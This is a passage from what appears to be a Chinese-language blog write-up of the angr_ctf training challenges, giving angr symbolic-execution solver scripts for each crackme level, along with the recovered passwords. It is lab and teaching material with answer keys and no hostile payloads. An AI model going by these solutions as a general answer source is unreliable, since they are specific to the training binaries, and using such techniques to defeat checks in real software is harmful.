punctuation">)</span>arg4 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg4'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> <span class="token number">0xA1BA1C0</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x10</span><span class="token punctuation">,</span> arg3<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr <span class="token operator">+</span> <span class="token number">0x18</span><span class="token punctuation">,</span> arg4<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg3<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg4<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'NAXTHGNR'</span><span class="token comment">#b'JVSFTPWE'</span><span class="token comment">#b'LMGAUHWC'</span><span class="token comment">#b'XMDCPALU'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h3><p>动态内存符号化， malloc 创建的地址未知，直接随便设置一个地址作为堆地址即可，堆地址存储在 bss 段的一个地址中，所以给 bss 段的变量一个自定义地址，往自定义地址里写输入位向量</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./06_angr_symbolic_dynamic_memory'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048699</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">)</span>addr1 <span class="token operator">=</span> <span class="token number">0xABCC8A4</span>addr2 <span class="token operator">=</span> <span class="token number">0xABCC8AC</span>heap_ptr1 <span class="token operator">=</span> <span class="token number">0x12340</span>heap_ptr2 <span class="token operator">=</span> <span class="token number">0x12350</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr1<span class="token punctuation">,</span> heap_ptr1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>addr2<span class="token punctuation">,</span> heap_ptr2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr1<span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>heap_ptr2<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg2<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'UBDKLMBV'</span><span class="token comment">#b'UNOERNYS'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="07-angr-symbolic-file"><a href="#07-angr-symbolic-file" class="headerlink" title="07_angr_symbolic_file"></a>07_angr_symbolic_file</h3><p><code>%64s</code> 64字符，每个字符 8 字节，长度是 8 * 64</p><p>从文件中读字符串进行对比，需要将文件内容符号化进行仿真文件系统，并且插入这个文件</p><p>blank_state 的起始地址是从 open 开始</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./07_angr_symbolic_file'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x80488ED</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">64</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>passwd_file <span class="token operator">=</span> angr<span class="token punctuation">.</span>storage<span class="token punctuation">.</span>SimFile<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> content<span class="token operator">=</span>arg1<span class="token punctuation">,</span> size<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>fs<span class="token punctuation">.</span>insert<span class="token punctuation">(</span><span class="token string">'OJKSQYDP.txt'</span><span class="token punctuation">,</span> passwd_file<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'AZOMMMZM\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x80\x00\x00\x04\x80\x08\x00\x00\x00\x00\x01\x00\x00\x00\x10\x01\x00\x00\x00\x04@\x01\x01\x01\x08\x80 \x00\x00\x10\x00\x00\x04\x01\x00\x00\x00\x00'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="08-angr-constraints"><a href="#08-angr-constraints" class="headerlink" title="08_angr_constraints"></a>08_angr_constraints</h3><p>比较函数使用了循环造成路径爆炸，直接 explore 运行到比较函数，通过添加约束来模拟比较过程而不实际执行比较过程</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./08_angr_constraints'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>blank_state<span class="token punctuation">(</span>addr<span class="token operator">=</span><span class="token number">0x8048625</span><span class="token punctuation">)</span>arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">16</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span>initial_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> arg1<span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span><span class="token number">0x8048565</span><span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    res <span class="token operator">=</span> solution_state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A050</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span>add<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'AUPDNNPROEZRJWKB'</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>solver<span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> cast_to<span class="token operator">=</span><span class="token builtin">bytes</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#b'LGCRCDGJHYUNGUJB'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="09-angr-hooks"><a href="#09-angr-hooks" class="headerlink" title="09_angr_hooks"></a>09_angr_hooks</h3><p>写 hook 函数，程序的 scanf 不复杂，直接从头开始，hook 函数中获取输入值与固定值进行比较，程序中比较函数的逻辑是比较成功就返回 1 失败返回 0 ，这里也是同理成功就用位向量 BVV 表示返回 1，hook 的起始是 call 比较函数的地址，长度是 call 指令与下一条指令的距离</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./09_angr_hooks'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@project<span class="token punctuation">.</span>hook</span><span class="token punctuation">(</span><span class="token number">0x80486B3</span><span class="token punctuation">,</span> length<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">func</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span><span class="token number">0x804A054</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    state<span class="token punctuation">.</span>regs<span class="token punctuation">.</span>eax <span class="token operator">=</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'XYMKBKUHNIQYNQXE'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#ZXIDRXEORJOTFFJNWUFAOUBLOGLQCCGK</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="10-angr-simprocedures"><a href="#10-angr-simprocedures" class="headerlink" title="10_angr_simprocedures"></a>10_angr_simprocedures</h3><p>判断函数调用了很多次，所以不能直接通过设置地址来 hook，而需要通过函数名来 hook，也就是使用 <code>hook_symbol</code> 通过函数名 hook 到类中的 run 函数，run 一参是 self，其他参数可以直接用判断函数的参数，加载地址也需要用 self.state</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./10_angr_simprocedures'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span><span class="token punctuation">:</span>        res <span class="token operator">=</span> self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>load<span class="token punctuation">(</span>a1<span class="token punctuation">,</span> a2<span class="token punctuation">)</span>        <span class="token keyword">return</span> claripy<span class="token punctuation">.</span>If<span class="token punctuation">(</span>res <span class="token operator">==</span> <span class="token string">'ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span> claripy<span class="token punctuation">.</span>BVV<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'check_equals_ORSDDWXHZURJRBDH'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">:</span>    solution_state <span class="token operator">=</span> simgr<span class="token punctuation">.</span>found<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>solution_state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#MSWKNJNAVTTOZMRY</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="11-angr-sim-scanf"><a href="#11-angr-sim-scanf" class="headerlink" title="11_angr_sim_scanf"></a>11_angr_sim_scanf</h3><p>hook scanf函数来应对复杂格式的输入，向scanf的参数中存入内容，并且将值存到 globals 全局变量插件中</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> angr<span class="token keyword">import</span> sys<span class="token keyword">import</span> claripyproject <span class="token operator">=</span> angr<span class="token punctuation">.</span>Project<span class="token punctuation">(</span><span class="token string">'./11_angr_sim_scanf'</span><span class="token punctuation">)</span>initial_state <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>entry_state<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">func</span><span class="token punctuation">(</span>angr<span class="token punctuation">.</span>SimProcedure<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> format_string<span class="token punctuation">,</span> param0<span class="token punctuation">,</span> param1<span class="token punctuation">)</span><span class="token punctuation">:</span>        arg1 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg1'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        arg2 <span class="token operator">=</span> claripy<span class="token punctuation">.</span>BVS<span class="token punctuation">(</span><span class="token string">'arg2'</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param0<span class="token punctuation">,</span> arg1<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span>memory<span class="token punctuation">.</span>store<span class="token punctuation">(</span>param1<span class="token punctuation">,</span> arg2<span class="token punctuation">,</span> endness <span class="token operator">=</span> <span class="token string">'LE'</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>state<span class="token punctuation">.</span><span class="token builtin">globals</span><span class="token punctuation">[</span><span class="token string">'solutions'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span>arg1<span class="token punctuation">,</span> arg2<span class="token punctuation">)</span>project<span class="token punctuation">.</span>hook_symbol<span class="token punctuation">(</span><span class="token string">'__isoc99_scanf'</span><span class="token punctuation">,</span> func<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>simgr <span class="token operator">=</span> project<span class="token punctuation">.</span>factory<span class="token punctuation">.</span>simulation_manager<span class="token punctuation">(</span>initial_state<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">right</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Good'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">def</span> <span class="token function">wrong</span><span class="token punctuation">(</span>state<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">b'Try'</span> <span class="token keyword">in</span> state<span class="token punctuation">.</span>posix<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>simgr<span class="token punctuation">.</span>explore<span class="token punctuation">(</span>find<span class="token operator">=</span>right<span class="token punctuation">,</span> avoid<span class="token operator">=</span>wrong<span class="token punctuation">)</span><span class="token keyword">if</span> simgr<span class="token 